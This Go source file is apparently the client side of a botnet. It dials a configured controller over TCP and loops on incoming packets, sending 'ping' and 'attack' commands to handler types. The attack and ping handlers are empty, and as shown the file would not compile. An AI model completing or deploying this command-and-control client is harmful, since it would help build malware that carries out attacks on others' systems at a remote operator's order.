package client

import (
	protocol "example/botnet-protocol"
	"fmt"
	"net"
	"strconv"
)

type Connection struct {
	host string
	port int32
}

func (c *Connection) Host() string {
	return c.host
}

func (c *Connection) SetHost(host string) {
	c.host = host
}

func (c *Connection) Port() int32 {
	return c.port
}

func (c *Connection) SetPort(port int32) {
	c.port = port
}

type Handler interface {
	onPacket(packetType int16, packet protocol.Packet, conn net.Conn)
}

type PingHandler struct {
}

type AttackHandler struct{}

func chooseHandler(packetType int16) Handler {
	if packetType == 1 {
		return PingHandler{}
	}
	if packetType == 2 {
		return AttackHandler{}
	}
	return nil
}

func Connect(connectionConfig Connection) {
	connectionString := connectionConfig.host + ":" + strconv.Itoa(int(connectionConfig.port))
	conn, _ := net.Dial("tcp", connectionString)

	for {
		var packet protocol.Packet
		packet = protocol.ReadMessage(conn)

		handler := chooseHandler(packet.PacketType())

		if handler == nil {
			continue
		}

		fmt.Printf("On packet %s\n", packet)
		handler.onPacket(packet.PacketType(), packet, conn)
	}
}
